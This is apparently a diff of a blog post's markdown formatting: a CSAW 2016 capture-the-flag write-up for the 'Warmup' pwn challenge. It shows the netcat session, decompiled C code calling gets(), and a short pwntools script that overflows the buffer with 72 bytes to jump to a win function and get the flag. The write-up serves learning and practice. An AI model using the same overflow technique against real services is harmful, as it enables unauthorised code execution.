@@ -23,7 +23,8 @@ tags:
 
 Let&#8217;s connect to the server and play with it a little bit:
 
-<pre class="lang:sh decode:true">[Meabeets] /tmp/CSAW/Warmup# nc pwn.chal.csaw.io 8000
+```sh
+[Meabeets] /tmp/CSAW/Warmup# nc pwn.chal.csaw.io 8000
 -Warm Up-
 WOW:0x40060d
 &gt;Beet
@@ -36,11 +37,14 @@ WOW:0x40060d
 [Meabeets] /tmp/CSAW/Warmup# nc pwn.chal.csaw.io 8000
 -Warm Up-
 WOW:0x40060d
-&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</pre>
+&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+```
+
 
 The program says &#8220;WOW:&#8221; followed by a memory address. This address is probably the address of the function we need to execute. Let&#8217;s open IDA to view the code:
 
-<pre class="toolbar:1 lang:c decode:true " title="From HEX-Rays Decompiler">int __cdecl main(int argc, const char **argv, const char **envp)
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
 {
 	  char s; // [sp+0h] [bp-80h]@1
 	  char v5; // [sp+40h] [bp-40h]@1
@@ -51,18 +55,23 @@ The program says &#8220;WOW:&#8221; followed by a memory address. This address i
 	  write(1, &s, 9uLL);
 	  write(1, (const void *)'@\aU', 1uLL);
 	  return gets(&v5, '&gt;');
-}b</pre>
+}b
+```
+
 
 This is a classic BOF (Buffer Overflow) case. The main method uses the `gets()` function to receive the given input and returns it. `gets()` is storing 64 characters (40h). Because there is no validation of the given string we need to supply an input that will exploit the program and make it jump to the wanted address: 0x40060d.
 
 A short python script will do the job:
 
-<pre class="lang:python decode:true ">from pwn import *
+```python
+from pwn import *
 
 r = remote('pwn.chal.csaw.io', 8000)
 print r.recv()
 r.sendline("A"*72 + "\x0D\x06\x40\x00\x00\x00\x00\x00")
-print r.recvline()</pre>
+print r.recvline()
+```
+
 
 And we got the flag: _FLAG{LET\_US\_BEGIN\_CSAW\_2016}_
 
